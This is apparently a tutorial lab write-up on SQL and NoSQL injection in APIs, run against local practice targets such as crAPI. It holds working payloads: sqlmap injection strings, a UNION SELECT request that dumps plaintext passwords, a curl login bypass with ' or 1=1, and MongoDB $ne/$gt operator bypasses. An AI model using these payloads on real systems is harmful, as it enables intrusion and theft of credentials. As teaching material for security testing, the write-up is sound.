# Intro

SQL injection (SQLi) vulnerabilities in APIs arise when user input is improperly handled in database queries, allowing attackers to execute arbitrary SQL statements. As NoSQL databases gain popularity, so do their injection vulnerabilities, especially with the flexible nature of query systems that don't strictly enforce a schema.

<img width="790" height="380" alt="image-46" src="https://github.com/user-attachments/assets/04153c77-ef97-4344-b700-19baf6df4600" />

SQL injection is a class of vulnerabilities that can result in unauthorized data access, manipulation, or even Remote Code Execution (RCE) depending on the privileges of the database user and the database's configuration.

## SQL Injection in a Nutshell

SQLi occurs when an attacker is able to inject malicious SQL statements into a query, typically through input fields or API endpoints. In the case of GET or POST requests, if user-provided values are directly used in SQL queries without proper sanitization, an attacker can manipulate the query logic.

Example SQL injection:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

If the input isn't sanitized properly, an attacker could submit the following for the password:

```sql
' OR '1'='1
```

This would result in the following query:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

This query would return the user data for the "admin" account since `'1'='1'` is always true.

SQL injection comes in various forms: error-based, blind, union-based, and time-based. Each method exploits different behaviors in the database and query execution.

When testing for SQLi, it's important to consider filtering mechanisms, such as escaping special characters (like `;`, `'`, or `--`), and bypass techniques like using comments or encoding. The SQL syntax differs across databases, so it’s crucial to tailor the attack based on the type of database in use. Common databases include MySQL, PostgreSQL, and SQLite, each having its own peculiarities when it comes to SQLi exploitation.

There are two main types of SQLi:

1. **Blind SQLi**: The application doesn’t show error messages but responds differently based on whether the injected query is true or false. For instance, an attacker may use time-based techniques to observe delays in responses.

2. **Error-based SQLi**: The attacker forces the database to return detailed error messages, which can expose valuable information such as the database version, table names, and column names.

In cases where the database allows Remote Code Execution (RCE), this vulnerability can be escalated further depending on the database configuration and user privileges.

# Fuzzing for SQLi

Fuzzing is a technique where random or specially crafted data is submitted to API endpoints in an attempt to trigger errors or unexpected behaviors. Fuzzing can help identify vulnerabilities by causing database errors, abnormal behavior, or unintended access controls.

Enumerate website functionality first (e.g., actions like creating users, sending messages) and look for places where input is reflected or used in database queries. Start by testing common SQL payloads to see if the application is vulnerable to SQL injection.

<img width="813" height="519" alt="image-41" src="https://github.com/user-attachments/assets/289ccc32-c5ab-4f36-b9ff-292476e59294" />

```http
GET /v1/001.php?roast=2 HTTP/1.1
Host: 172.19.0.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
```

## BurpSuite

In the example below, a basic GET request to the `/v1/001.php` endpoint is intercepted, and the `roast` parameter is fuzzed:

```http
GET /v1/001.php?roast=2 HTTP/1.1
Host: 172.19.0.3
```

We can then analyze the responses to identify any abnormal behavior (e.g., error messages, different status codes) that might indicate a SQLi vulnerability.

<img width="1695" height="790" alt="image-43" src="https://github.com/user-attachments/assets/939ad180-bfd1-48bb-8110-b20758555070" />

## FFuF

FFuF (Fuzz Faster U Fool) is a fast web fuzzer used for discovering hidden files or parameters. It can also be used for SQL injection testing by sending SQL payloads to API endpoints. The following command uses FFuF to fuzz the `roast` parameter:

```bash
ffuf -u http://172.19.0.3//v1/001.php\?roast=FUZZ -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -fc 200
```

FFuF works by analyzing response status codes, content size, and duration, making it an effective tool for finding parameters vulnerable to SQL injection.

<img width="1104" height="618" alt="image-44" src="https://github.com/user-attachments/assets/97e35681-a818-4ca0-b0a9-254c125ff383" />

## SQLmap

SQLmap is an automated tool designed to detect and exploit SQL injection vulnerabilities.

<img width="1714" height="865" alt="image-45" src="https://github.com/user-attachments/assets/3b771584-d8d0-4945-ab52-91de944ab805" />

Running SQLmap against the `roast` parameter revealed multiple SQL injection techniques, each exploiting a different aspect of the database:

- **Boolean-Based Blind:** Determines injection by evaluating conditions that return `TRUE` or `FALSE`.  
  **Payload:** `roast=5 AND 5508=5508`

- **Error-Based:** Forces the database to produce an error message containing useful information.  
  **Payload:** `roast=5 AND GTID_SUBSET(CONCAT(0x7171717a71,(SELECT (ELT(1356=1356,1))),0x7170627a71),1356)`

- **Time-Based Blind:** Determines injection success by inducing a delay.  
  **Payload:** `roast=5 AND (SELECT 9550 FROM (SELECT(SLEEP(5)))XyBb)`

- **UNION-Based:** Extracts data by merging attacker-controlled queries with legitimate ones.  
  **Payload:** `roast=5 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171717a71,0x4d477959786f4d4b7845697a426559757a6d4b784158477a494d6c51545a6d7257434267734b5363,0x7170627a71)-- -`


SQLmap identified a MySQL (≥5.6) database running on a Debian-based Apache-PHP stack. The active database, `api_injection`, contained multiple tables, including `coffee` and `users`.

```sql
Database: api_injection
Table: coffee
+----+-----------------------+-----------+-------------+
| ID | name                  | origin    | roast_level |
+----+-----------------------+-----------+-------------+
| 1  | Ethiopian Yirgacheffe | Ethiopia  | 5           |
| 2  | Colombian Supremo     | Colombia  | 2           |
| 3  | Sumatra Mandheling    | Indonesia | 5           |
| 4  | Mexican Altura        | Mexico    | 2           |
| 5  | Guatemalan Antigua    | Guatemala | 3           |
+----+-----------------------+-----------+-------------+
```

A `users` table was also extracted, containing plaintext credentials:

```sql
Database: api_injection
Table: users
+----+-----------------+----------+
| ID | password        | username |
+----+-----------------+----------+
| 1  | iLikePasta      | admin    |
| 2  | jeremyspassword | jeremy   |
+----+-----------------+----------+
```

# Using UNION SELECT to Steal Data

One of the primary exploitation methods once SQL injection is identified is using the `UNION SELECT` operator to retrieve sensitive information, such as user credentials. Here's an example query used to steal usernames and passwords from the `users` table:

**Example Request:**

```http
GET /v1/001.php?roast=5+UNION+SELECT+username,password,null,null+from+users HTTP/1.1
```

In this case, the attacker is injecting a `UNION SELECT` query that retrieves the `username` and `password` columns from the `users` table. Since the table structure of the original query may not match, the attacker uses `NULL` as placeholders for other columns. The `CONCAT` function may also be used to combine multiple pieces of data into a single field.

This technique exposes critical data, such as the `admin` user's password, and can potentially allow an attacker to log in to the application and gain unauthorized access.


```http
GET /v1/001.php?roast=5+UNION+SELECT+username,password,null,null+from+users HTTP/1.1
Host: 172.19.0.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.19.0.3/
Connection: keep-alive
Priority: u=0

```

This query results in the server returning sensitive user information in the response:

```json
[
  {
    "ID": "1",
    "name": "Ethiopian Yirgacheffe",
    "origin": "Ethiopia",
    "roast_level": "5"
  },
  {
    "ID": "admin",
    "name": "iLikePasta",
    "origin": null,
    "roast_level": null
  }
]

```

# Authentication Bypass

SQL injection can be used to bypass authentication mechanisms in APIs by manipulating login queries. When APIs use direct SQL queries for authentication without proper input sanitization, attackers can modify the query logic to gain unauthorized access.

## Lab

The lab demonstrates authentication bypass on the `/v1/002.php` endpoint that handles user login via POST requests.

Testing the endpoint with regular credentials reveals an error message that exposes the SQL query structure:

<img width="1536" height="448" alt="image-47" src="https://github.com/user-attachments/assets/160a9130-e95a-48f4-a5d5-932c92f6f308" />

Initial testing with `'admin` as username breaks the query syntax and generates a MySQL error, indicating SQL injection potential:

_Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for
the right syntax to use near 'admin' AND password = 'pass'' at line 1_

Using a simple authentication bypass payload:

```bash
curl http://172.19.0.2/v1/002.php -H "Content-Type: application/json" \
-d "{\"username\":\"' or 1=1;-- -\",\"password\":\"pass\"}"
```

The injection succeeds, resulting in admin access:

<img width="1383" height="278" alt="image-48" src="https://github.com/user-attachments/assets/01b5303f-c88b-41d4-b7f9-b409ce2802c8" />
<img width="1391" height="828" alt="image-49" src="https://github.com/user-attachments/assets/6b8017e7-199e-4eb9-9d7e-3e2f3670783a" />

# NoSQL Injection

NoSQL injection vulnerabilities arise when APIs fail to properly sanitize input used in NoSQL database queries. While similar to SQL injection in concept, NoSQL injection exploits the flexible query syntax of document-based databases like MongoDB.

MongoDB is particularly common in API implementations due to its JSON-like document structure and schema flexibility. Instead of tables and rows, MongoDB uses collections and documents, making it well-suited for REST APIs that handle JSON data.

For fuzzing NoSQL injection, specialized wordlists like [SecLists/Fuzzing/Databases/NoSQL.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/NoSQL.txt) contain MongoDB-specific operators and syntax:

<img width="861" height="437" alt="image-50" src="https://github.com/user-attachments/assets/52c5180c-4999-4ea5-90a9-d069e3616684" />

This following payload attempts a NoSQL injection attack using MongoDB's query operator `$ne` (not equal). Here's how it works:

1. The `[$ne]` operator is injected into the password field
2. The query effectively becomes: `{username: "admin", password: {$ne: "fake_pass"}}`
3. This MongoDB query matches documents where:
   - username equals "admin" AND
   - password is NOT equal to "fake_pass"

Since most passwords won't equal "fake_pass", this bypasses authentication by making the password check always true. The successful login message "Success! You logged in as admin" confirms the attack worked.

<img width="1537" height="828" alt="image-51" src="https://github.com/user-attachments/assets/d9658b24-becd-4285-b697-f8f60285a91c" />

## Lab 

The crAPI application's coupon validation functionality demonstrates a NoSQL injection vulnerability.

<img width="1905" height="699" alt="image-52" src="https://github.com/user-attachments/assets/f3fe5603-2288-4626-9f36-b79c25ce18b9" />

Initial testing of the `/community/api/v2/coupon/validate-coupon` endpoint with a basic coupon code:

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Content-Length: 24
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJqb2huQGVtYWlsLmNvbSIsImlhdCI6MTczOTU1NzEzMCwiZXhwIjoxNzQwMTYxOTMwLCJyb2xlIjoidXNlciJ9.TD7emv7OfENE0GxWpGPOBkhSbKLJUsq_Q6-MpKOz4xykoMqnet0vTSqrDj9nV7EQrrbNL1MvViiDrdQbnh3jZTxOu6iFjsJ_UTLgHmZ7KqZoDjRGLEiKzlZ3Hjc05hQo2dYBKGyYbomlbUv_M5yGc1tMZQbIPxCiT0hDEEOeP4AibHVwF4VUfJjCYuR9XLLLtn3-1T6X-QexGe496r_KQ0Dg6cu38e8Qck0xV-a06GgCVwjYVSpnNibLl9nQQsvVEgYkREMpj5Ma9gNsKRy4cZJ-Q21tUNFjy18HwfydoE0DylezGscqlMyHyL3gDjZ7PyWOLVW2zwQJxGSSt-LPoQ
Content-Type: application/json
Origin: http://localhost:8888
Referer: http://localhost:8888/shop
Connection: keep-alive

{"coupon_code":"123123"}


HTTP/1.1 500 Internal Server Error
Server: openresty/1.25.3.1
Date: Fri, 14 Feb 2025 18:20:46 GMT
Content-Type: application/json
Connection: keep-alive
Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Content-Length: 3

{}
```

Fuzzing the `coupon_code` parameter reveals MongoDB query operator errors:

<img width="1676" height="396" alt="image-53" src="https://github.com/user-attachments/assets/906ac389-62be-413c-92ce-87e4a75b4e57" />

Testing with the MongoDB comparison operator `$gt` successfully bypasses validation:

```bash
curl -X POST 'http://localhost:8888/community/api/v2/coupon/validate-coupon' \
-H 'Content-Type: application/json' \
-H $token \
-d '{"coupon_code":{"$gt": ""}}'
```

The injection reveals a valid coupon:

<img width="1531" height="393" alt="image-54" src="https://github.com/user-attachments/assets/7c01bc3d-7001-4db2-9951-ab8e197ba42c" />

```json
{
  "coupon_code": "TRAC075",
  "amount": 75,
  "CreatedAt": "2025-02-14T17:35:09.937Z"
}
```
